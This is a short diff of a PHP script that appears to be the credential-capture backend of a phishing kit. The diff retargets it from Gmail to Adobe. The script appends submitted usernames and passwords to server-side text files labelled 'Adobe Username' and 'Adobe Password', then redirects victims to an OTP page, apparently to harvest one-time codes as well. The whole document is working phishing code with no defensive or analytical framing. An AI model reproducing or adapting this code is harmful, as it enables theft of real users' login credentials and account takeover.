@@ -1,8 +1,8 @@
 <?php
 
-file_put_contents("gmail.txt", "" . $email = $_POST['email'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Adobe Username : " . $email = $_POST['username'] . "\n", FILE_APPEND);
 ?>
 <?php
-file_put_contents("pass.txt", "" . $pass = $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: otp.html');
+file_put_contents("pass.txt", "Adobe Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
+header('Location: otp.php');
 ?>
